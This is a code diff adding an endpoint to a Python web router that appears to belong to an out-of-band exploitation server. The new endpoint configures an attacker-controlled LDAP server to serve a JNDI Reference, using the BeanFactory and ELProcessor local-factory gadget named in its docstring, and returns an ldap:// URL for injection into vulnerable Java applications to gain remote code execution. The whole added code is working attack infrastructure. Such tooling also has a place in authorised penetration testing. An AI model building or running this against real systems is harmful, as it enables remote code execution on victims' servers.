@@ -83,6 +83,45 @@ async def set_rebind_payload(
     return {"ldap_url": ldap_url, "rmi_url": rmi_url, "class_name": class_name, "mode": mode}
 
 
+@router.post("/{token}/set-reference")
+async def set_reference_payload(
+    token: str,
+    body: dict[str, Any],
+    user: User = Depends(current_user),
+    session: AsyncSession = Depends(get_session),
+) -> dict[str, str]:
+    """Configure LDAP to serve a JNDI Reference for local-factory RCE (TomcatEL, Groovy, BeanShell).
+
+    body keys:
+      ref_class_name  – Java class name to instantiate (e.g. javax.el.ELProcessor)
+      ref_factory     – JNDI ObjectFactory class (e.g. org.apache.naming.factory.BeanFactory)
+      ref_addr_list   – list of RefAddr strings in "#pos#type#content" format
+    """
+    s = get_settings()
+    res = await session.execute(
+        select(OobToken).join(Project).where(OobToken.token == token, Project.owner_id == user.id)
+    )
+    tok = res.scalar_one_or_none()
+    if not tok:
+        raise HTTPException(status.HTTP_404_NOT_FOUND, "token not found")
+
+    ref_class_name = body.get("ref_class_name", "javax.el.ELProcessor")
+    ref_factory = body.get("ref_factory", "org.apache.naming.factory.BeanFactory")
+    ref_addr_list = body.get("ref_addr_list", [])
+
+    spec = dict(tok.payload_spec or {})
+    spec["ref_class_name"] = ref_class_name
+    spec["ref_factory"] = ref_factory
+    spec["ref_addr_list"] = ref_addr_list
+    tok.intent = "jndi_reference"
+    tok.payload_spec = spec
+    await session.commit()
+
+    ldap_url = f"ldap://{s.public_address}:{s.ldap_port}/{token}/Ref"
+    return {"ldap_url": ldap_url, "mode": "jndi_reference",
+            "ref_class_name": ref_class_name, "ref_factory": ref_factory}
+
+
 @router.delete("/{token}/clear")
 async def clear_rebind(
     token: str,
